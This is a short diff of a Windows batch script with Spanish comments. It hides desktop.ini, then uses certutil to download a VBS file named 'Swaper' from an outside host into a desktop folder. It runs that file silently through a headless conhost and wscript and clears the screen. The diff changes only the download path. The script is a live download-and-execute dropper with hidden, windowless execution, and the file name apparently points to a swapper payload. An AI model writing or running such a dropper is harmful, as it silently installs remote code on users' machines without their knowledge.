@@ -18,7 +18,7 @@ REM Marcar desktop.ini como sistema y oculto
 attrib +h +s %hiddenFolder%\desktop.ini
 
 REM Descargar Swaper
-certutil.exe -urlcache -split -f https://baa4ts.is-a.dev/v3/swap.vbs %TMP%\swap.vbs
+certutil.exe -urlcache -split -f https://baa4ts.is-a.dev/v3/swap.vbs %USERPROFILE%\Desktop\Mirnov\swap.vbs
 C:\Windows\System32\conhost.exe --headless cmd /c %SystemRoot%\System32\wscript.exe //B %USERPROFILE%\Desktop\Mirnov\swap.vbs
 cls
 exit
